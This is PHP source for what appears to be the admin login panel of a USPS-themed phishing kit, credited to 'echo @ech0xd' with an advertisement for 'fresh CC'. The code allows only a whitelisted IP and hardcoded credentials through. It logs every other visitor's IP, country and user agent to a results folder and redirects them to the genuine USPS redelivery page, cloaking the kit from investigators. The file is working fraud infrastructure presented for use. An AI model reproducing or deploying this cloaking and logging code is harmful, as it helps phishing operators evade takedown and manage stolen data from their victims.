<?php
/* 
***********************

CODED BY echo @ech0xd 

More source code and tools and fresh CC

***********************
*/
function ipp(){
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$ini_array = parse_ini_file("setting.ini");

$IP = strval($ini_array['WhitelistedIp']);
$ipssss = ipp();
$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ipssss));
$country = $ipdat->geoplugin_countryCode;
if ($IP == $ipssss){
    error_reporting(0);
    session_start();
    function login($username,$password) {
        if($username == 'echo' && $password == 'echo'){  //Login Infos
            return 'valid';
        }else{
            return 'invalid';
        }
    }
    if(isset($_POST['password'])) {
        $login = login($_POST['email'], $_POST['password']);
        if($login == "valid") {
            $_SESSION['email_admin'] = $_POST['email'];
            $_SESSION['email_password'] = $_POST['password'];
            echo "<script type='text/javascript'>window.top.location='index.php';</script>";
            exit();
        }else{
            echo "<script type='text/javascript'>window.top.location='?p=fail';</script>";
            exit();
        }
    }
}else{
    $os = $_SERVER['HTTP_USER_AGENT'];
    $countryy = $ipdat->geoplugin_countryName;
    $click = fopen("../result/total_Blocked.txt","a");
    fwrite($click,"$ipssss|$country|$os"."\n");
    fclose($click);
    header("Location: https://tools.usps.com/redelivery.htm");
    exit();
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Required meta tags-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="au theme template">
    <meta name="author" content="Hau Nguyen">
    <meta name="keywords" content="au theme template">

    <!-- Title Page-->
    <title>ECHO</title>

    <!-- Fontfaces CSS-->
    <link href="css/font-face.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-4.7/css/font-awesome.min.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-5/css/fontawesome-all.min.css" rel="stylesheet" media="all">
    <link href="vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">

    <!-- Bootstrap CSS-->
    <link href="vendor/bootstrap-4.1/bootstrap.min.css" rel="stylesheet" media="all">

    <!-- Vendor CSS-->
    <link href="vendor/animsition/animsition.min.css" rel="stylesheet" media="all">

    <!-- Main CSS-->
    <link href="css/theme.css" rel="stylesheet" media="all">

</head>

<body class="">
    <div class="page-wrapper">
        <div class="page-content--bge5">
            <div class="container">
                <div class="login-wrap">
                    <div class="login-content">
                        <div class="login-logo">
                            <h1>ECHO</h1>
                        </div>
                        <div class="login-form">
                            <form action="" method="post">
                                <?php
                                if($_GET['p'] == "fail") {
                                    echo ' <center><span style="color:red">Please check your public key or password</span><br><br></center>';
                                }
                               ?>
                                <div class="form-group">
                                    <label>Username</label>
                                    <input class="au-input au-input--full" type="text" name="email" placeholder="Please input Username">
                                </div>
                                <div class="form-group">
                                    <label>Password</label>
                                    <input class="au-input au-input--full" type="password" name="password" placeholder="Please enter password">
                                </div>
                               
                                <button class="au-btn au-btn--block au-btn--green m-b-20" type="submit">sign in</button>
                                
                            </form>
                            
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </div>

    <!-- Jquery JS-->
    <script src="vendor/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap JS-->
    <script src="vendor/bootstrap-4.1/popper.min.js"></script>
    <script src="vendor/bootstrap-4.1/bootstrap.min.js"></script>
    <!-- Vendor JS       -->
    <script src="vendor/slick/slick.min.js">
    </script>
    <script src="vendor/wow/wow.min.js"></script>
    <script src="vendor/animsition/animsition.min.js"></script>
    <script src="vendor/bootstrap-progressbar/bootstrap-progressbar.min.js">
    </script>
    <script src="vendor/counter-up/jquery.waypoints.min.js"></script>
    <script src="vendor/counter-up/jquery.counterup.min.js">
    </script>
    <script src="vendor/circle-progress/circle-progress.min.js"></script>
    <script src="vendor/perfect-scrollbar/perfect-scrollbar.js"></script>
    <script src="vendor/chartjs/Chart.bundle.min.js"></script>
    <script src="vendor/select2/select2.min.js">
    </script>

    <!-- Main JS-->
    <script src="js/main.js"></script>

</body>

</html>
<!-- end document-->